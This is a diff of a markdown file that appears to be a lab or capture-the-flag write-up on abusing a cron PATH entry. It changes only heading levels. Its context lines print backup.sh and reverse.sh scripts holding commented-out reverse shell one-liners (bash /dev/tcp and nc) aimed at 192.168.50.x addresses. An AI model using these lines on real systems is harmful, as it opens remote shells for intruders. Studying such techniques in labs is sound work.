@@ -324,7 +324,7 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 ```
-# backup.sh script
+### backup.sh script
 
 ```
 #!/bin/bash
@@ -332,7 +332,7 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 # bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
 #nc 192.168.50.234 1234
 ```
-# reverse.sh
+### reverse.sh
 ```
 #!/bin/bash
 #bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
